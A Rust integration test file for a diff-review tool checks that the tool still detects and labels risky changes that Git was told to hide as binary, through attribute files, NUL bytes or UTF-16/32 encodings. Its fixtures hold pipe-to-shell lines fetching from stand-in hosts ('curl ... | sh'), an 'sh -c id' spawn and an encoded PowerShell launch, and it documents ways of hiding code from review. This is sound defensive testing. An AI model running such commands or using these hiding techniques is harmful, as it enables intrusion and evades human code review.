//! S3.20: what the reviewed repository says about its own files must not blind the review. One
//! line `*.rs -diff`, in any attributes file Git reads, made `git diff` print a Rust change as a
//! `GIT binary patch`, and every evidence rule went blind: a change that starts a process ranked
//! as a harmless binary change (`binary_changed`, 3, `binary_change`). A NUL byte in a comment
//! did the same with no attribute at all. Each way Git can be told so is built here in a real
//! repository, in the three Git selections, and read through the binary: the evidence is found
//! and the act itself is labelled `diff_suppressed`, with its cause.
#![cfg(unix)]
#![expect(
    clippy::disallowed_methods,
    reason = "integration test: drives git, the binary and temp directories"
)]

use deep_diff_forge_testkit::Scratch;
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::process::Command;

const ISOLATE: [(&str, &str); 2] = [
    ("GIT_CONFIG_GLOBAL", "/dev/null"),
    ("GIT_CONFIG_NOSYSTEM", "1"),
];

fn git(root: &Path, args: &[&str]) {
    let out = Command::new("git")
        .current_dir(root)
        .envs(ISOLATE)
        .args([
            "-c",
            "user.name=ddf",
            "-c",
            "user.email=ddf@example.invalid",
        ])
        .args([
            "-c",
            "commit.gpgSign=false",
            "-c",
            "init.defaultBranch=main",
        ])
        .args(args)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

struct Repo(
    PathBuf,
    #[expect(dead_code, reason = "held for its Drop, which removes the directory")] Scratch,
);

/// How Git is told that `m.rs` is binary.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Hide {
    /// `*.rs -diff` in a `.gitattributes` that is never committed or staged.
    TreeUntracked,
    /// `*.rs -diff` in a `.gitattributes` the change itself adds.
    TreeInChange,
    /// `*.rs -diff` in `.git/info/attributes`, which no diff ever shows.
    InfoAttributes,
    /// `*.rs -diff` in a file the repository's own `core.attributesFile` names.
    ConfigAttributesFile,
    /// `* binary` in a `.gitattributes` committed before the change.
    StarBinary,
    /// `*.rs diff=bin` with `diff.bin.binary = true` in the repository's configuration.
    DriverBinary,
    /// No attribute: one NUL byte in a comment.
    Nul,
    /// Controls: no attribute (an undefined driver falls back to text), a real image.
    UndefinedDriver,
    Plain,
    Image,
}

const HIDDEN: [Hide; 7] = [
    Hide::TreeUntracked,
    Hide::TreeInChange,
    Hide::InfoAttributes,
    Hide::ConfigAttributesFile,
    Hide::StarBinary,
    Hide::DriverBinary,
    Hide::Nul,
];

const MODES: [&str; 3] = ["--git-range", "--git-working-tree", "--git-staged"];

fn source(nul: bool, spawn: bool) -> Vec<u8> {
    let mut text = b"fn main() {\n".to_vec();
    if nul {
        text.extend_from_slice(b"    // marker \0 here\n");
    }
    text.extend_from_slice(b"    let x = 1;\n");
    if spawn {
        text.extend_from_slice(
            b"    let _ = std::process::Command::new(\"sh\").arg(\"-c\").arg(\"id\").status();\n",
        );
    }
    text.extend_from_slice(b"    println!(\"{x}\");\n}\n");
    text
}

/// A PNG signature and every byte value, NUL included: binary to Git, and not UTF-8.
fn image(seed: u8) -> Vec<u8> {
    let mut bytes = b"\x89PNG\r\n\x1a\n".to_vec();
    bytes.extend((0..=255u8).cycle().take(600).map(|b| b.wrapping_mul(seed)));
    bytes
}

/// The repository of `hide` with its change made the way `mode` reads it: committed for a
/// range, staged, or left in the working tree.
fn repo(hide: Hide, mode: &str) -> Repo {
    let scratch = Scratch::new(&format!("cli-attr-{hide:?}{}", mode.len()));
    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
    let root = &r.0;
    let write = |path: &str, bytes: &[u8]| std::fs::write(root.join(path), bytes).unwrap();
    git(root, &["init", "-q"]);
    let file = if hide == Hide::Image {
        "img.png"
    } else {
        "m.rs"
    };
    let content = |after: bool| match hide {
        Hide::Image => image(if after { 7 } else { 3 }),
        _ => source(hide == Hide::Nul, after),
    };
    write(file, &content(false));
    match hide {
        Hide::StarBinary => write(".gitattributes", b"* binary\n"),
        Hide::InfoAttributes => {
            std::fs::create_dir_all(root.join(".git/info")).unwrap();
            write(".git/info/attributes", b"*.rs -diff\n");
        }
        Hide::ConfigAttributesFile => {
            write(".git/attrs", b"*.rs -diff\n");
            let attrs = root.join(".git/attrs");
            git(
                root,
                &["config", "core.attributesFile", attrs.to_str().unwrap()],
            );
        }
        Hide::DriverBinary => git(root, &["config", "diff.bin.binary", "true"]),
        _ => {}
    }
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", "base"]);
    write(file, &content(true));
    if hide == Hide::TreeInChange {
        write(".gitattributes", b"*.rs -diff\n");
        git(root, &["add", ".gitattributes"]);
    }
    match mode {
        "--git-range" => {
            git(root, &["add", "-A"]);
            git(root, &["commit", "-q", "-m", "change"]);
        }
        "--git-staged" => git(root, &["add", "-A"]),
        _ => {}
    }
    match hide {
        Hide::TreeUntracked => write(".gitattributes", b"*.rs -diff\n"),
        Hide::DriverBinary => write(".gitattributes", b"*.rs diff=bin\n"),
        Hide::UndefinedDriver => write(".gitattributes", b"*.rs diff=nonexistent\n"),
        _ => {}
    }
    r
}

fn selection(mode: &str) -> Vec<&str> {
    if mode == "--git-range" {
        vec![mode, "HEAD~1..HEAD"]
    } else {
        vec![mode]
    }
}

/// The `--rank --json` entry of `path`.
fn ranked(r: &Repo, mode: &str, path: &str) -> Value {
    let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
        .envs(ISOLATE)
        .args(selection(mode))
        .arg("--repo")
        .arg(&r.0)
        .args(["--rank", "--json"])
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let doc: Value = serde_json::from_slice(&out.stdout).unwrap();
    doc["ranked"]
        .as_array()
        .unwrap()
        .iter()
        .find(|entry| entry["path"] == path)
        .cloned()
        .unwrap_or_else(|| panic!("{path} not ranked: {doc}"))
}

/// Before the fix every row read `binary_changed 3 [binary_change]` in every mode (measured on
/// the 0.9.0 line); now the process spawn is found and the act is labelled, with its cause.
#[test]
fn a_text_file_git_was_told_to_hide_is_read_and_the_act_is_labelled() {
    for hide in HIDDEN {
        let cause = if hide == Hide::Nul {
            "content"
        } else {
            "attribute"
        };
        for mode in MODES {
            let entry = ranked(&repo(hide, mode), mode, "m.rs");
            let row = format!("{hide:?} {mode}: {entry}");
            assert_eq!(entry["status"], "modified", "{row}");
            assert_eq!(
                entry["signals"],
                json!(["diff_suppressed", "process_spawn"]),
                "{row}"
            );
            assert_eq!(entry["score"], 11, "{row}");
            assert_eq!(entry["diff_suppressed"], cause, "{row}");
            assert_eq!(entry["evidence"][0]["signal"], "process_spawn", "{row}");
        }
    }
}

/// A real binary stays binary and carries no label; an ordinary file, or one whose `diff`
/// attribute names a driver nobody defined (Git falls back to text), is read as before.
#[test]
fn a_real_binary_or_an_ordinary_file_is_read_as_before() {
    for mode in MODES {
        let image = ranked(&repo(Hide::Image, mode), mode, "img.png");
        assert_eq!(image["status"], "binary_changed", "{mode}: {image}");
        assert_eq!(image["signals"], json!(["binary_change"]), "{mode}");
        assert!(image.get("diff_suppressed").is_none(), "{mode}: {image}");
        for hide in [Hide::Plain, Hide::UndefinedDriver] {
            let entry = ranked(&repo(hide, mode), mode, "m.rs");
            assert_eq!(
                entry["signals"],
                json!(["process_spawn"]),
                "{hide:?} {mode}"
            );
            assert_eq!(entry["score"], 6, "{hide:?} {mode}");
            assert!(entry.get("diff_suppressed").is_none(), "{hide:?} {mode}");
        }
    }
}

/// `review.change` (the MCP and RPC servers) reads a change the same way: its rank view is the
/// CLI's for the same repository, label and cause included.
#[test]
fn review_change_reads_the_hidden_change_as_the_cli_does() {
    use deep_diff_forge_daemon::{Engine, dispatch, parse_request};
    let r = repo(Hide::InfoAttributes, "--git-staged");
    let engine = Engine::new()
        .allowing_repos(std::slice::from_ref(&r.0))
        .unwrap();
    let line = json!({"method": "review.change", "params": {"repo": r.0, "selection": "staged", "view": "rank"}})
        .to_string();
    let answer = dispatch(&parse_request(&line).unwrap(), &engine).unwrap();
    let entry = &answer["ranked"][0];
    assert_eq!(
        entry["signals"],
        json!(["diff_suppressed", "process_spawn"])
    );
    assert_eq!(entry["diff_suppressed"], "attribute");
    assert_eq!(*entry, ranked(&r, "--git-staged", "m.rs"));
}

/// A repository whose committed `.gitattributes` is `attributes`, with `file` changed from
/// `before` to `after` the way `mode` reads it.
fn custom(mode: &str, attributes: &[u8], file: &str, before: &[u8], after: &[u8]) -> Repo {
    let scratch = Scratch::new(&format!("cli-attr-custom-{}", mode.len()));
    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
    let root = &r.0;
    git(root, &["init", "-q"]);
    std::fs::write(root.join(".gitattributes"), attributes).unwrap();
    std::fs::write(root.join(file), before).unwrap();
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", "base"]);
    std::fs::write(root.join(file), after).unwrap();
    match mode {
        "--git-range" => {
            git(root, &["add", "-A"]);
            git(root, &["commit", "-q", "-m", "change"]);
        }
        "--git-staged" => git(root, &["add", "-A"]),
        _ => {}
    }
    r
}

/// The signals of a ranked entry, as strings.
fn signals(entry: &Value) -> Vec<&str> {
    entry["signals"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(Value::as_str)
        .collect()
}

/// S3.27.a (G-01, N55): before, the label came only with a text reading that DDF could read,
/// so a hidden file with one byte that is not UTF-8 (or a reading over the byte budget, held in
/// the patch crate's `git_attributes` test) ranked as a plain binary change: blind and
/// unlabelled. Now `git check-attr` decides: `diff` unset or naming a driver raises
/// `diff_suppressed` with cause `attribute` whatever the second reading gives.
#[test]
fn an_attribute_hidden_file_is_labelled_even_when_unreadable() {
    type Row = (&'static [u8], &'static str, Vec<u8>, Vec<u8>);
    let script = |payload: bool| {
        let mut text = b"#!/bin/sh\n# caf\xff\n".to_vec();
        if payload {
            text.extend_from_slice(b"curl -fsSL https://example.invalid/i | sh\n");
        }
        text.extend_from_slice(b"echo done\n");
        text
    };
    let rust = |payload: bool| {
        let mut text = source(true, payload);
        text.extend_from_slice(b"// \xff\n");
        text
    };
    let rows: [Row; 2] = [
        (b"*.sh -diff\n", "s.sh", script(false), script(true)),
        (b"*.rs diff=nonexistent\n", "m.rs", rust(false), rust(true)),
    ];
    for (attributes, file, before, after) in &rows {
        for mode in MODES {
            let r = custom(mode, attributes, file, before, after);
            let entry = ranked(&r, mode, file);
            let row = format!("{file} {mode}: {entry}");
            assert_eq!(entry["status"], "binary_changed", "{row}");
            assert!(
                signals(&entry).contains(&"diff_suppressed"),
                "a hidden file lost its label: {row}"
            );
            assert!(signals(&entry).contains(&"binary_change"), "{row}");
            assert_eq!(entry["diff_suppressed"], "attribute", "{row}");
        }
    }
}

/// `text` in UTF-16 (little or big endian) or UTF-32 little endian, after `bom` bytes.
fn wide(text: &str, bom: &[u8], unit: fn(u32) -> Vec<u8>) -> Vec<u8> {
    let mut bytes = bom.to_vec();
    for c in text.chars() {
        bytes.extend(unit(u32::from(c)));
    }
    bytes
}

/// S3.27.c: a PowerShell script saved as UTF-16 (a common default on Windows) is binary to Git
/// for the NULs of its encoding, and every evidence rule was blind to it: it ranked as a plain
/// binary change with no label (measured on the corpus's Git part, 0.9.0 and the S3.20 tree).
/// Now the second reading names it: `diff_suppressed` with cause `encoding`, for a byte order
/// mark (UTF-16 either way, UTF-32) and for UTF-16 without one. Decoding the text for the token
/// readers is parked; the label is the answer for now. A NUL byte in a UTF-8 comment stays
/// `content` (`a_text_file_git_was_told_to_hide_is_read_and_the_act_is_labelled`).
#[test]
fn utf16_sources_are_labelled_encoding() {
    type Unit = fn(u32) -> Vec<u8>;
    let le = |c: u32| u16::try_from(c).unwrap().to_le_bytes().to_vec();
    let be = |c: u32| u16::try_from(c).unwrap().to_be_bytes().to_vec();
    let le32 = |c: u32| c.to_le_bytes().to_vec();
    let script = |payload: bool| {
        let mut text = String::from("Write-Output 'start'\r\n");
        if payload {
            text.push_str("Start-Process powershell -ArgumentList '-enc','AAAA'\r\n");
        }
        text.push_str("Write-Output 'done'\r\n");
        text
    };
    let rows: [(&str, &[u8], Unit, &str); 4] = [
        ("UTF-16LE with a mark", b"\xff\xfe", le, "binary_changed"),
        ("UTF-16BE with a mark", b"\xfe\xff", be, "binary_changed"),
        (
            "UTF-32LE with a mark",
            b"\xff\xfe\0\0",
            le32,
            "binary_changed",
        ),
        ("UTF-16LE without a mark", b"", le, "modified"),
    ];
    for (name, bom, unit, status) in rows {
        let before = wide(&script(false), bom, unit);
        let after = wide(&script(true), bom, unit);
        for mode in MODES {
            let r = custom(mode, b"", "b.ps1", &before, &after);
            let entry = ranked(&r, mode, "b.ps1");
            let row = format!("{name} {mode}: {entry}");
            assert!(
                signals(&entry).contains(&"diff_suppressed"),
                "a wide-encoded file lost its encoding label: {row}"
            );
            assert_eq!(entry["diff_suppressed"], "encoding", "{row}");
            assert_eq!(entry["status"], status, "{row}");
        }
    }
}

/// S3.27.f: a changed file whose name is not UTF-8 cannot be named exactly in a review, so the
/// change is refused. It exited 3 (`io`, which says "may be transient, retry"); retrying never
/// helps, so it is now 4 (`change_input`), with the class of path named, in every Git mode. A
/// repository that cannot be read at all is still an I/O failure, 3.
#[cfg(target_os = "linux")]
#[test]
fn a_non_utf8_file_name_is_a_change_input_refusal() {
    use std::os::unix::ffi::OsStrExt as _;
    for mode in MODES {
        let scratch = Scratch::new(&format!("cli-attr-latin-{}", mode.len()));
        let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
        let root = &r.0;
        git(root, &["init", "-q"]);
        let name = root.join(std::ffi::OsStr::from_bytes(b"caf\xe9.rs"));
        std::fs::write(&name, b"fn a() {}\n").unwrap();
        git(root, &["add", "-A"]);
        git(root, &["commit", "-q", "-m", "base"]);
        std::fs::write(&name, b"fn b() {}\n").unwrap();
        match mode {
            "--git-range" => {
                git(root, &["add", "-A"]);
                git(root, &["commit", "-q", "-m", "change"]);
            }
            "--git-staged" => git(root, &["add", "-A"]),
            _ => {}
        }
        let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
            .envs(ISOLATE)
            .args(selection(mode))
            .arg("--repo")
            .arg(root)
            .args(["--rank", "--json"])
            .output()
            .unwrap();
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert_eq!(out.status.code(), Some(4), "{mode}: {stderr}");
        assert!(out.stdout.is_empty(), "{mode}");
        assert!(
            stderr.contains("a file name that is not UTF-8"),
            "{mode}: {stderr}"
        );
    }
    let scratch = Scratch::new("cli-attr-gone");
    let gone = scratch.join("no-such-repository");
    let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
        .envs(ISOLATE)
        .args(["--git-working-tree", "--repo"])
        .arg(&gone)
        .args(["--rank", "--json"])
        .output()
        .unwrap();
    assert_eq!(
        out.status.code(),
        Some(3),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
}

/// The evidence signals of a ranked entry, in order.
fn evidence(entry: &Value) -> Vec<&str> {
    entry["evidence"]
        .as_array()
        .map(|rows| {
            rows.iter()
                .filter_map(|row| row["signal"].as_str())
                .collect()
        })
        .unwrap_or_default()
}

/// S3.27.b (G-02): the hook's judge makes its patch with an empty attribute source, so Git never
/// hides a file there, while `--git-working-tree` reads what Git hid a second time. For one
/// attribute-hidden change both find the same evidence; the act of hiding, `diff_suppressed`,
/// is known only to the Git selection.
#[test]
fn the_judge_path_and_the_git_selection_find_the_same_evidence() {
    use std::io::Write as _;
    let r = repo(Hide::InfoAttributes, "--git-working-tree");
    let git_entry = ranked(&r, "--git-working-tree", "m.rs");

    let scratch = Scratch::new("cli-attr-judge");
    let work = scratch.join("work");
    std::fs::create_dir_all(&work).unwrap();
    let options = deep_diff_forge_patch::GitAcquireOptions {
        env: ISOLATE
            .iter()
            .map(|(k, v)| (std::ffi::OsString::from(k), std::ffi::OsString::from(v)))
            .collect(),
        ..deep_diff_forge_patch::GitAcquireOptions::default()
    };
    let patch = deep_diff_forge_patch::judge_patch(&r.0, "HEAD", &work, &options).unwrap();
    assert!(
        !String::from_utf8_lossy(&patch.bytes).contains("GIT binary patch"),
        "the judge's patch hid the file"
    );
    let mut child = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
        .args(["--stdin-patch", "--rank", "--json"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(&patch.bytes).unwrap();
    let out = child.wait_with_output().unwrap();
    assert!(out.status.success());
    let doc: Value = serde_json::from_slice(&out.stdout).unwrap();
    let judge_entry = doc["ranked"]
        .as_array()
        .unwrap()
        .iter()
        .find(|entry| entry["path"] == "m.rs")
        .cloned()
        .unwrap();

    assert!(
        !evidence(&judge_entry).is_empty(),
        "the judge path found nothing: {judge_entry}"
    );
    assert_eq!(
        evidence(&git_entry),
        evidence(&judge_entry),
        "the Git selection and the judge path found different evidence:\n{git_entry}\n{judge_entry}"
    );
    let without = |entry: &Value| -> Vec<String> {
        signals(entry)
            .into_iter()
            .filter(|s| *s != "diff_suppressed")
            .map(str::to_owned)
            .collect()
    };
    assert_eq!(without(&git_entry), without(&judge_entry));
    assert!(signals(&git_entry).contains(&"diff_suppressed"));
    assert!(!signals(&judge_entry).contains(&"diff_suppressed"));
    assert!(judge_entry.get("diff_suppressed").is_none());
}

/// A repository holding `file` as `before` (`None`: absent) in its base commit, changed to
/// `after` (`None`: deleted) the way `mode` reads it. A placeholder keeps the base non-empty.
fn changed(mode: &str, file: &str, before: Option<&[u8]>, after: Option<&[u8]>) -> Repo {
    let scratch = Scratch::new(&format!("cli-attr-changed-{}", mode.len()));
    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
    let root = &r.0;
    git(root, &["init", "-q"]);
    std::fs::write(root.join("keep.txt"), b"keep\n").unwrap();
    if let Some(bytes) = before {
        std::fs::write(root.join(file), bytes).unwrap();
    }
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", "base"]);
    match after {
        Some(bytes) => std::fs::write(root.join(file), bytes).unwrap(),
        None => std::fs::remove_file(root.join(file)).unwrap(),
    }
    match mode {
        "--git-range" => {
            git(root, &["add", "-A"]);
            git(root, &["commit", "-q", "-m", "change"]);
        }
        "--git-staged" => git(root, &["add", "-A"]),
        _ => {}
    }
    r
}

/// S3.27.c, the class closed per side: the encoding is judged on the lines of each side. Before,
/// every hunk line counted, so a UTF-8 source rewritten in a wide encoding (its removed lines
/// UTF-8) ranked `binary_changed` with no label: blind and unlabelled, the most natural form of
/// the class. Now the new side alone decides, and the old side decides when the change cannot
/// be read as text: UTF-16 and UTF-32, either byte order, with and without a mark; a new file;
/// a deleted one; a wide file back to UTF-8; a wide file with an ordinary hunk; a short line
/// among wide ones. A wide file without a mark turned back into UTF-8 is read as text, `content`.
#[test]
fn a_source_rewritten_in_a_wide_encoding_is_labelled_encoding() {
    type Unit = fn(u32) -> Vec<u8>;
    type Row = (&'static str, Option<Vec<u8>>, Option<Vec<u8>>, &'static str);
    let le: Unit = |c| u16::try_from(c).unwrap().to_le_bytes().to_vec();
    let be: Unit = |c| u16::try_from(c).unwrap().to_be_bytes().to_vec();
    let le32: Unit = |c| c.to_le_bytes().to_vec();
    let be32: Unit = |c| c.to_be_bytes().to_vec();
    let utf8 = b"fn a() {}\n".to_vec();
    let spawn = "use std::process::Command;\r\nfn a() { Command::new(\"sh\").spawn(); }\r\n";
    let lines: String = (0..12)
        .map(|n| ["line ", &n.to_string(), " of the script\r\n"].concat())
        .collect();
    let edited = lines.replace("line 3 of", "line three of");
    let mut mixed = wide(&edited, b"", le);
    mixed.extend_from_slice(b"\necho plain\n");
    let mut short = wide(&lines, b"", le);
    short.extend(wide("a\n", b"", le));
    let mut rows: Vec<Row> = Vec::new();
    for (name, unit, mark) in [
        ("UTF-16LE", le, b"\xff\xfe".as_slice()),
        ("UTF-16BE", be, b"\xfe\xff"),
        ("UTF-32LE", le32, b"\xff\xfe\0\0"),
        ("UTF-32BE", be32, b"\0\0\xfe\xff"),
    ] {
        rows.push((
            name,
            Some(utf8.clone()),
            Some(wide(spawn, mark, unit)),
            "encoding",
        ));
        rows.push((
            name,
            Some(utf8.clone()),
            Some(wide(spawn, b"", unit)),
            "encoding",
        ));
    }
    rows.extend([
        (
            "new file",
            None,
            Some(wide(spawn, b"\xff\xfe", le)),
            "encoding",
        ),
        (
            "deleted",
            Some(wide(spawn, b"\xff\xfe", le)),
            None,
            "encoding",
        ),
        (
            "deleted, no mark",
            Some(wide(spawn, b"", le)),
            None,
            "encoding",
        ),
        (
            "back to UTF-8",
            Some(wide(spawn, b"\xff\xfe", le)),
            Some(utf8.clone()),
            "encoding",
        ),
        (
            "back to UTF-8, no mark",
            Some(wide(spawn, b"", le)),
            Some(utf8),
            "content",
        ),
        (
            "wide and ordinary hunks",
            Some(wide(&lines, b"", le)),
            Some(mixed),
            "encoding",
        ),
        (
            "short line",
            Some(wide(&lines, b"", le)),
            Some(short),
            "encoding",
        ),
    ]);
    for (name, before, after, cause) in &rows {
        for mode in MODES {
            if before.is_none() && mode == "--git-working-tree" {
                continue; // an untracked file is not in the working-tree selection
            }
            let r = changed(mode, "m.rs", before.as_deref(), after.as_deref());
            let entry = ranked(&r, mode, "m.rs");
            let row = format!("{name} {mode}: {entry}");
            assert!(
                signals(&entry).contains(&"diff_suppressed"),
                "a source rewritten in a wide encoding is unlabelled: {row}"
            );
            assert_eq!(entry["diff_suppressed"], *cause, "{row}");
        }
    }
}

/// S3.27.g (the owner's decision: the review goes on and the file is loud). A binary by
/// content whose text form passes the 64 MiB budget (33 MiB of NUL bytes, one changed: a tiny
/// binary section, a 66 MiB text one) cannot be read again. S3.27.d refused the whole review
/// for it (exit 4); 0.9.0 read it as a silent binary change. Now it keeps its binary section and
/// carries `diff_suppressed` with cause `unread`, and the files after it in Git's order are
/// still read again with what is left of the budget: a `-diff` source after it is read as text
/// and labelled `attribute`; a small real image stays a binary change with no label. The
/// command line has no option that lowers the budget, so the file is built at full size.
#[test]
fn a_binary_too_large_to_read_again_is_labelled_unread() {
    let large = |changed: bool| {
        let mut bytes = vec![0_u8; 33 << 20];
        if changed {
            bytes[1 << 20] = 7;
        }
        bytes
    };
    for mode in MODES {
        let scratch = Scratch::new(&format!("cli-attr-unread-{}", mode.len()));
        let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
        let root = &r.0;
        git(root, &["init", "-q"]);
        std::fs::create_dir_all(root.join(".git/info")).unwrap();
        std::fs::write(root.join(".git/info/attributes"), b"*.rs -diff\n").unwrap();
        let write = |after: bool| {
            std::fs::write(root.join("a.bin"), large(after)).unwrap();
            std::fs::write(root.join("b.rs"), source(false, after)).unwrap();
            std::fs::write(root.join("c.png"), image(if after { 7 } else { 3 })).unwrap();
        };
        write(false);
        git(root, &["add", "-A"]);
        git(root, &["commit", "-q", "-m", "base"]);
        write(true);
        match mode {
            "--git-range" => {
                git(root, &["add", "-A"]);
                git(root, &["commit", "-q", "-m", "change"]);
            }
            "--git-staged" => git(root, &["add", "-A"]),
            _ => {}
        }
        let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
            .envs(ISOLATE)
            .args(selection(mode))
            .arg("--repo")
            .arg(root)
            .args(["--rank", "--json"])
            .output()
            .unwrap();
        assert_eq!(
            out.status.code(),
            Some(0),
            "{mode}: the review was refused: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        let doc: Value = serde_json::from_slice(&out.stdout).unwrap();
        let entry = |path: &str| {
            doc["ranked"]
                .as_array()
                .unwrap()
                .iter()
                .find(|entry| entry["path"] == path)
                .cloned()
                .unwrap_or_else(|| panic!("{path} not ranked: {doc}"))
        };
        let (a, b, c) = (entry("a.bin"), entry("b.rs"), entry("c.png"));
        assert_eq!(a["status"], "binary_changed", "{mode}: {a}");
        assert!(signals(&a).contains(&"binary_change"), "{mode}: {a}");
        assert_eq!(
            a["diff_suppressed"], "unread",
            "{mode}: the binary that could not be read again is silent: {a}"
        );
        assert_eq!(b["diff_suppressed"], "attribute", "{mode}: {b}");
        assert!(signals(&b).contains(&"process_spawn"), "{mode}: {b}");
        assert_eq!(signals(&c), ["binary_change"], "{mode}: {c}");
        assert!(c.get("diff_suppressed").is_none(), "{mode}: {c}");
    }
}

/// The `--rank --json` document of `r`'s change, from one run.
fn ranked_all(r: &Repo, mode: &str) -> Value {
    let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
        .envs(ISOLATE)
        .args(selection(mode))
        .arg("--repo")
        .arg(&r.0)
        .args(["--rank", "--json"])
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{mode}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    serde_json::from_slice(&out.stdout).unwrap()
}

/// The entry of `path` in a `--rank --json` document.
fn of(doc: &Value, path: &str) -> Value {
    doc["ranked"]
        .as_array()
        .unwrap()
        .iter()
        .find(|entry| entry["path"] == path)
        .cloned()
        .unwrap_or_else(|| panic!("{path} not ranked: {doc}"))
}

/// A repository with `files` committed as one line each (`old line`), `hidden`
/// in `.git/info/attributes`, then changed to the given bytes the way `mode` reads it.
fn many(mode: &str, hidden: &[u8], files: &[(&str, Vec<u8>)]) -> Repo {
    let scratch = Scratch::new(&format!("cli-attr-many-{}-{}", mode.len(), files.len()));
    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
    let root = &r.0;
    git(root, &["init", "-q"]);
    std::fs::create_dir_all(root.join(".git/info")).unwrap();
    std::fs::write(root.join(".git/info/attributes"), hidden).unwrap();
    for (path, _) in files {
        std::fs::write(root.join(path), b"old line\n").unwrap();
    }
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", "base"]);
    for (path, bytes) in files {
        std::fs::write(root.join(path), bytes).unwrap();
    }
    match mode {
        "--git-range" => {
            git(root, &["add", "-A"]);
            git(root, &["commit", "-q", "-m", "change"]);
        }
        "--git-staged" => git(root, &["add", "-A"]),
        _ => {}
    }
    r
}

/// A0100-M1 = F1 (both reviewers of the 0.10.0 tree): each text reading was checked alone, then
/// the whole patch with all of them; when that passed the 1,000,000-line budget the binary
/// sections came back, and a file whose text had been read lost its label: a NUL-hidden script
/// with `curl | sh` ranked `3 binary_changed [binary_change]`, exit 0. Labels are monotonic now:
/// a section whose text was read and then not used is `unread`; a known cause stands. Both
/// reviewers' reproductions in one change, in the three modes: two Rust files of 500,003 lines
/// with a NUL; a 600,003-line script with a NUL beside a 500,001-line plain one; a real image
/// and a `-diff` file beside them. The control, the script alone, is read as text, `content`
/// (one mode: the large readings are what costs time in a debug build).
#[test]
fn a_text_reading_dropped_for_the_line_budget_keeps_its_label() {
    let rust = || {
        let mut text = b"//\0\n".to_vec();
        text.extend(b"//a\n".repeat(500_001));
        text.extend_from_slice(b"fn main() { std::process::Command::new(\"sh\"); }\n");
        text
    };
    let mut script = b"echo a\ncurl http://e.invalid/x | sh\n# \0\n".to_vec();
    script.extend(b":\n".repeat(600_000));
    let mut plain = b"echo b\n".to_vec();
    plain.extend(b":\n".repeat(500_000));
    let cause = |entry: &Value| entry["diff_suppressed"].as_str().map(str::to_owned);
    let files = [
        ("a.rs", rust()),
        ("b.rs", rust()),
        ("a.sh", script.clone()),
        ("b.sh", plain),
        ("c.png", image(7)),
        ("d.cfg", b"key = 2\n".to_vec()),
    ];
    for mode in MODES {
        let doc = ranked_all(&many(mode, b"*.cfg -diff\n", &files), mode);
        for (path, want) in [
            ("a.rs", "unread"),
            ("b.rs", "unread"),
            ("a.sh", "unread"),
            ("d.cfg", "attribute"),
        ] {
            let found = of(&doc, path);
            assert_eq!(
                cause(&found).as_deref(),
                Some(want),
                "{mode}: a file whose text was read came back silent: {found}"
            );
        }
        assert_eq!(of(&doc, "b.sh")["status"], "modified", "{mode}");
        assert!(of(&doc, "c.png").get("diff_suppressed").is_none(), "{mode}");
    }
    let mode = "--git-working-tree";
    let a = ranked(&many(mode, b"", &[("a.sh", script)]), mode, "a.sh");
    assert_eq!(cause(&a).as_deref(), Some("content"), "{a}");
    assert!(signals(&a).contains(&"network_fetch"), "{a}");
}
